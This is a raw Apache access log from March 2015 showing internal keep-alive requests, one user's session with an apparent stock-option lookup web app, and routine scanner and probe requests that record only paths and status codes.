::1 - - [07/Mar/2015:22:19:20 -0500] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [07/Mar/2015:22:19:21 -0500] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [07/Mar/2015:22:19:22 -0500] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [07/Mar/2015:22:19:23 -0500] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [08/Mar/2015:01:09:58 -0500] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [08/Mar/2015:01:10:17 -0500] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [08/Mar/2015:01:10:18 -0500] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [08/Mar/2015:01:10:19 -0500] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [08/Mar/2015:01:36:18 -0500] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [08/Mar/2015:01:36:19 -0500] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [08/Mar/2015:01:36:20 -0500] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [08/Mar/2015:01:37:26 -0500] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
61.240.144.65 - - [08/Mar/2015:05:07:47 -0400] "GET / HTTP/1.0" 200 1401 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
::1 - - [08/Mar/2015:06:31:10 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [08/Mar/2015:06:31:10 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [08/Mar/2015:06:31:10 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [08/Mar/2015:06:31:10 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [08/Mar/2015:06:31:10 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [08/Mar/2015:06:31:10 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [08/Mar/2015:06:31:10 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [08/Mar/2015:06:31:10 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [08/Mar/2015:06:31:10 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [08/Mar/2015:06:31:10 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [08/Mar/2015:06:31:10 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [08/Mar/2015:06:31:10 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [08/Mar/2015:06:31:10 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [08/Mar/2015:06:31:10 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [08/Mar/2015:06:31:10 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [08/Mar/2015:06:31:10 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [08/Mar/2015:08:50:33 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [08/Mar/2015:08:50:34 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [08/Mar/2015:08:50:35 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [08/Mar/2015:08:50:36 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [08/Mar/2015:08:50:37 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [08/Mar/2015:08:50:38 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [08/Mar/2015:08:50:39 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [08/Mar/2015:09:45:29 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
61.147.107.109 - - [08/Mar/2015:11:08:14 -0400] "POST /index.php HTTP/1.1" 404 470 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
94.102.49.168 - - [08/Mar/2015:12:14:28 -0400] "GET /cgi-bin/index.cgi HTTP/1.0" 404 514 "-" "-"
80.82.64.116 - - [08/Mar/2015:13:12:57 -0400] "GET /cgi-bin/index.cgi HTTP/1.0" 404 514 "-" "-"
80.82.64.116 - - [08/Mar/2015:14:24:29 -0400] "GET /cgi-bin/index.cgi HTTP/1.0" 404 514 "-" "-"
::1 - - [08/Mar/2015:18:14:13 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
80.82.64.116 - - [08/Mar/2015:18:17:07 -0400] "GET /cgi-bin/index.cgi HTTP/1.0" 404 514 "-" "-"
68.185.202.206 - - [08/Mar/2015:19:56:06 -0400] "GET /favicon.ico HTTP/1.1" 404 470 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36"
74.143.6.126 - - [09/Mar/2015:01:21:06 -0400] "GET /tmUnblock.cgi HTTP/1.1" 400 527 "-" "-"
80.82.64.116 - - [09/Mar/2015:01:27:35 -0400] "GET /cgi-bin/index.cgi HTTP/1.0" 404 514 "-" "-"
::1 - - [09/Mar/2015:01:43:06 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
222.186.56.21 - - [09/Mar/2015:01:56:34 -0400] "GET / HTTP/1.1" 200 1401 "-" "-"
80.82.64.116 - - [09/Mar/2015:02:50:42 -0400] "GET /cgi-bin/index.cgi HTTP/1.0" 404 514 "-" "-"
::1 - - [09/Mar/2015:04:22:12 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [09/Mar/2015:05:09:09 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [09/Mar/2015:08:07:47 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
192.187.110.98 - - [09/Mar/2015:09:04:35 -0400] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 471 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
::1 - - [09/Mar/2015:09:22:47 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [09/Mar/2015:10:08:30 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
129.120.246.12 - - [09/Mar/2015:10:25:07 -0400] "GET / HTTP/1.1" 304 173 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:09 -0400] "GET /getlist.js HTTP/1.1" 304 173 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:10 -0400] "GET /favicon.ico HTTP/1.1" 404 470 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:11 -0400] "GET /getyear.php?q=AA&d=C&sid=0.8227219199761748 HTTP/1.1" 200 268 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:12 -0400] "GET /getstrike.php?q=AA&d=C&y=2015&m=&r=&sid=0.9485503165051341 HTTP/1.1" 200 256 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:12 -0400] "GET /getday.php?q=AA&d=C&y=2015&m=&sid=0.22845076816156507 HTTP/1.1" 200 256 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:12 -0400] "GET /getmonth.php?q=AA&d=C&y=2015&sid=0.681208036839962 HTTP/1.1" 200 271 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:12 -0400] "GET /getstrike.php?q=AA&d=C&y=2015&m=03&r=&sid=0.011165306204929948 HTTP/1.1" 200 256 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:12 -0400] "GET /getday.php?q=AA&d=C&y=2015&m=03&sid=0.05047067441046238 HTTP/1.1" 200 268 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:12 -0400] "GET /getstrike.php?q=AA&d=C&y=2015&m=03&r=&sid=0.736613254295662 HTTP/1.1" 200 256 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:12 -0400] "GET /getday.php?q=AA&d=C&y=2015&m=03&sid=0.3718032040633261 HTTP/1.1" 200 268 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:12 -0400] "GET /getyear.php?q=AA&d=P&sid=0.1236652412917465 HTTP/1.1" 200 268 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:13 -0400] "GET /getday.php?q=AA&d=P&y=2015&m=&sid=0.8347680722363293 HTTP/1.1" 200 256 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:13 -0400] "GET /getstrike.php?q=AA&d=P&y=2015&m=&r=&sid=0.9185371019411832 HTTP/1.1" 200 256 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:13 -0400] "GET /getmonth.php?q=AA&d=P&y=2015&sid=0.5428695771843195 HTTP/1.1" 200 271 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:13 -0400] "GET /getstrike.php?q=AA&d=P&y=2015&m=03&r=&sid=0.007634608307853341 HTTP/1.1" 200 256 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:13 -0400] "GET /getstrike.php?q=AA&d=P&y=2015&m=03&r=&sid=0.7824878948740661 HTTP/1.1" 200 256 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:13 -0400] "GET /getday.php?q=AA&d=P&y=2015&m=03&sid=0.3279489274136722 HTTP/1.1" 200 268 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:13 -0400] "GET /getday.php?q=AA&d=P&y=2015&m=03&sid=0.3855057470500469 HTTP/1.1" 200 268 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:13 -0400] "GET /getstrike.php?q=AA&d=P&y=2015&m=03&r=06&sid=0.20347881503403187 HTTP/1.1" 200 294 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:13 -0400] "GET /getstrike.php?q=AA&d=P&y=2015&m=03&r=06&sid=0.6482116691768169 HTTP/1.1" 200 294 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:13 -0400] "GET /getstrike.php?q=AA&d=P&y=2015&m=03&r=06&sid=0.9890515506267548 HTTP/1.1" 200 294 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:13 -0400] "GET /getstrike.php?q=AA&d=P&y=2015&m=03&r=06&sid=0.8497514817863703 HTTP/1.1" 200 294 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:13 -0400] "GET /getstrike.php?q=AA&d=P&y=2015&m=03&r=06&sid=0.7005131670739502 HTTP/1.1" 200 294 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:16 -0400] "GET /getyear.php?q=AA&d=C&sid=0.295905394712463 HTTP/1.1" 200 268 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:17 -0400] "GET /getday.php?q=AA&d=C&y=2015&m=&sid=0.16716458252631128 HTTP/1.1" 200 256 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:17 -0400] "GET /getmonth.php?q=AA&d=C&y=2015&sid=0.2415528220590204 HTTP/1.1" 200 271 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:17 -0400] "GET /getstrike.php?q=AA&d=C&y=2015&m=&r=&sid=0.9618830082472414 HTTP/1.1" 200 256 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:17 -0400] "GET /getstrike.php?q=AA&d=C&y=2015&m=03&r=&sid=0.32654564222320914 HTTP/1.1" 200 256 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:17 -0400] "GET /getday.php?q=AA&d=C&y=2015&m=03&sid=0.6278364064637572 HTTP/1.1" 200 268 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:17 -0400] "GET /getday.php?q=AA&d=C&y=2015&m=03&sid=0.5311876316554844 HTTP/1.1" 200 268 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:17 -0400] "GET /getstrike.php?q=AA&d=C&y=2015&m=03&r=&sid=0.73629682790488 HTTP/1.1" 200 256 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:17 -0400] "GET /getstrike.php?q=AA&d=C&y=2015&m=03&r=06&sid=0.7878668329212815 HTTP/1.1" 200 297 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:17 -0400] "GET /getstrike.php?q=AA&d=C&y=2015&m=03&r=06&sid=0.3434736041817814 HTTP/1.1" 200 297 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:17 -0400] "GET /getstrike.php?q=AA&d=C&y=2015&m=03&r=06&sid=0.15720889903604984 HTTP/1.1" 200 297 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:17 -0400] "GET /getstrike.php?q=AA&d=C&y=2015&m=03&r=06&sid=0.4614458344876766 HTTP/1.1" 200 297 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:17 -0400] "GET /getstrike.php?q=AA&d=C&y=2015&m=03&r=06&sid=0.8252024406101555 HTTP/1.1" 200 297 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:18 -0400] "GET /getmonth.php?q=AA&d=C&y=2016&sid=0.3984247629996389 HTTP/1.1" 200 259 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:19 -0400] "GET /getday.php?q=AA&d=C&y=2016&m=01&sid=0.7800301231909543 HTTP/1.1" 200 259 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:19 -0400] "GET /getstrike.php?q=AA&d=C&y=2016&m=01&r=&sid=0.03782793949358165 HTTP/1.1" 200 256 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:19 -0400] "GET /getstrike.php?q=AA&d=C&y=2016&m=01&r=15&sid=0.2270868152845651 HTTP/1.1" 200 286 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:10:25:19 -0400] "POST /result.php HTTP/1.1" 200 619 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:11:14:37 -0400] "GET /index.html?submit=BACK HTTP/1.1" 200 729 "http://66.175.223.240:8080/result.php" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:11:14:41 -0400] "GET /getyear.php?q=MCD&d=C&sid=0.9469861211255193 HTTP/1.1" 200 268 "http://66.175.223.240:8080/index.html?submit=BACK" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:11:14:42 -0400] "GET /getday.php?q=MCD&d=C&y=2015&m=&sid=0.5950998419430107 HTTP/1.1" 200 256 "http://66.175.223.240:8080/index.html?submit=BACK" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:11:14:42 -0400] "GET /getmonth.php?q=MCD&d=C&y=2015&sid=0.23153605009429157 HTTP/1.1" 200 271 "http://66.175.223.240:8080/index.html?submit=BACK" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:11:14:42 -0400] "GET /getstrike.php?q=MCD&d=C&y=2015&m=&r=&sid=0.5863969700876623 HTTP/1.1" 200 256 "http://66.175.223.240:8080/index.html?submit=BACK" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:11:14:42 -0400] "GET /getday.php?q=MCD&d=C&y=2015&m=03&sid=0.870324190473184 HTTP/1.1" 200 268 "http://66.175.223.240:8080/index.html?submit=BACK" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:11:14:42 -0400] "GET /getstrike.php?q=MCD&d=C&y=2015&m=03&r=&sid=0.9507285461295396 HTTP/1.1" 200 256 "http://66.175.223.240:8080/index.html?submit=BACK" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:11:14:42 -0400] "GET /getstrike.php?q=MCD&d=C&y=2015&m=03&r=&sid=0.05944661842659116 HTTP/1.1" 200 256 "http://66.175.223.240:8080/index.html?submit=BACK" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:11:14:42 -0400] "GET /getday.php?q=MCD&d=C&y=2015&m=03&sid=0.614867580588907 HTTP/1.1" 200 268 "http://66.175.223.240:8080/index.html?submit=BACK" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:11:14:42 -0400] "GET /getstrike.php?q=MCD&d=C&y=2015&m=03&r=06&sid=0.6848019976168871 HTTP/1.1" 200 335 "http://66.175.223.240:8080/index.html?submit=BACK" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:11:14:42 -0400] "GET /getstrike.php?q=MCD&d=C&y=2015&m=03&r=06&sid=0.745857146801427 HTTP/1.1" 200 335 "http://66.175.223.240:8080/index.html?submit=BACK" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:11:14:45 -0400] "GET /getmonth.php?q=MCD&d=C&y=2017&sid=0.13465986354276538 HTTP/1.1" 200 259 "http://66.175.223.240:8080/index.html?submit=BACK" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:11:14:45 -0400] "GET /getday.php?q=MCD&d=C&y=2017&m=01&sid=0.08681037044152617 HTTP/1.1" 200 259 "http://66.175.223.240:8080/index.html?submit=BACK" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:11:14:45 -0400] "GET /getstrike.php?q=MCD&d=C&y=2017&m=01&r=&sid=0.17179687088355422 HTTP/1.1" 200 256 "http://66.175.223.240:8080/index.html?submit=BACK" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:11:14:45 -0400] "GET /getstrike.php?q=MCD&d=C&y=2017&m=01&r=20&sid=0.27944735693745315 HTTP/1.1" 200 314 "http://66.175.223.240:8080/index.html?submit=BACK" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
129.120.246.12 - - [09/Mar/2015:11:14:46 -0400] "POST /result.php HTTP/1.1" 200 631 "http://66.175.223.240:8080/index.html?submit=BACK" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
::1 - - [09/Mar/2015:11:39:43 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
61.240.144.67 - - [09/Mar/2015:12:07:21 -0400] "GET / HTTP/1.0" 200 1401 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
222.76.242.219 - - [09/Mar/2015:13:19:07 -0400] "GET /manager/html HTTP/1.1" 404 470 "-" "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"
::1 - - [09/Mar/2015:13:24:58 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [09/Mar/2015:14:26:36 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
195.88.209.6 - - [09/Mar/2015:16:34:08 -0400] "GET http://5.61.43.116/ HTTP/1.1" 200 729 "-" "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
